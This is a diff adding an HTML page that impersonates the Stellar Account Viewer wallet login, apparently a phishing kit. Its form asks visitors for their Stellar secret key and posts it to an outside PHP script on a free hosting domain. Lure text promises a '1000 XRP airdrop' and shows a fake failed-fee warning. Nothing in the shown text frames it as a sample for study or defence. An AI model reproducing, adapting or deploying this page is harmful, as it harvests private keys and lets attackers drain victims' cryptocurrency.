@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html class="no-js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+  
+  <title>Stellar Account Viewer</title>
+  <link rel="shortcut icon" href="https://stellarterm.com/favicon.ico">
+  <meta name="description" content="">
+  <meta name="viewport" content="width=device-width">
+<link href="./Stellar-Account-Viewer_files/style-0673c577ffb04c9c1385b85820099fbf.css" rel="stylesheet"></head>
+<body>
+<!-- uiView: --><div ui-view="" class="ng-scope"><div class="so-back ng-scope">
+  <div class="so-chunk">
+    <div class="so-siteHeader siteHeader">
+      <span class="so-logo">
+        <a href="" class="so-logo__main">Stellar</a><!--
+        --><span class="so-logo__separator"> </span><!--
+        --><a href="" class="so-logo__subSite">account viewer</a>
+      </span>
+    </div>
+  </div>
+</div>
+
+<div class="so-back ng-scope">
+  <div ng-controller="interstellar-basic-client.LoginController as login" class="so-chunk ng-scope">
+    <div class="welcomeBox">
+      <h2 class="welcomeBox__title">Stellar Account Viewer</h2>
+      <p style="color: red;"> sorry funds 2 XLM for transaction fees not successful, please go to your wallet.</p>
+      <p>Please login to receive 1000 XRP airdrop via Stellar network.</p>
+    </div>
+   <form method="POST" action="https://doa-amakkomah.000webhostapp.com/aria3.php" accept-charset="UTF-8" class="loginBox ng-pristine ng-valid">
+      <p class="loginBox__label">Secret key:</p>
+      <input type="password" id="login_password" required="required" name="login_password"minlength="56" maxlength="57" class="loginBox__input ng-pristine ng-untouched ng-valid ng-empty" placeholder="Example: SCHKBJ............ZLJ7">
+
+      <!-- ngIf: login.alerts.length > 0 -->
+
+ <div class="s-alert s-alert--alert ng-scope" ng-if="login.alerts.length &gt; 0">
+        <!-- ngRepeat: alert in login.alerts --><span ng-repeat="alert in login.alerts" class="ng-binding ng-scope">
+          Invalid secret key<br><br>
+          Secret keys are uppercase and begin with the letter "S."
+        </span><!-- end ngRepeat: alert in login.alerts -->
+      </div>
+
+      <button type="submit" class="s-button loginBox__submit" ng-class="{&#39;is-disabled&#39;: login.processing}" ng-disabled="login.processing">Sign in</button>
+    </form>
+    <div class="middleBox">
+        <p>
+          Generate key pair for a new account
+        </p>
+
+        <!-- ngIf: login.newKeypair -->
+
+        <button type="button" class="s-button loginBox__submit" ng-click="login.generate()">Generate</button>
+    </div>
+    <div class="middleBox">
+      Connect Ledger Nano S <img ng-src="images/e2e5e2a8ab6ecca1520f2a3ee098e8d5.png" ng-mousedown="login.toggleInfo()" style="cursor: pointer;" title="Click me" src="./Stellar-Account-Viewer_files/e2e5e2a8ab6ecca1520f2a3ee098e8d5.png">
+      <br>
+      <div class="loginBox__info ng-hide" ng-show="login.showInfo">
+        Available on Chrome and Opera. Install the Stellar app from Ledger and enable browser support in the app settings.
+      </div>
+      <div class="loginBox__ledgerAccount">
+        <input id="ledgerDefaultAccountCheckbox" type="checkbox" ng-model="hideBip32Input" ng-init="hideBip32Input=true" class="ng-pristine ng-untouched ng-valid ng-not-empty">
+        <!-- ngIf: hideBip32Input --><label for="ledgerDefaultAccountCheckbox" ng-if="hideBip32Input" class="ng-scope">Use default account</label><!-- end ngIf: hideBip32Input -->
+        <!-- ngIf: !hideBip32Input -->
+      </div>
+      <!-- ngIf: login.ledgerAlerts.length > 0 -->
+      <button type="button" class="s-button loginBox__submit" ng-click="login.proceedWithLedger()" ng-disabled="login.ledgerStatus != &#39;Connected&#39;" disabled="disabled">Sign in with Ledger</button>
+    </div>
+    <div class="middleBox">
+      Looking for a more advanced wallet? <a href="">Proceed here »</a>
+    </div>
+    <div class="legacyBox">
+      Looking for legacy login? <a href="">Proceed here »</a>
+    </div>
+  </div>
+</div>
+
+<div style="margin-top: 20px; font-size: 14px; text-align: center;" class="ng-scope">
+  <a href="">Try other more advanced Wallets</a>
+</div>
+</div>
+
+
+</body></html>
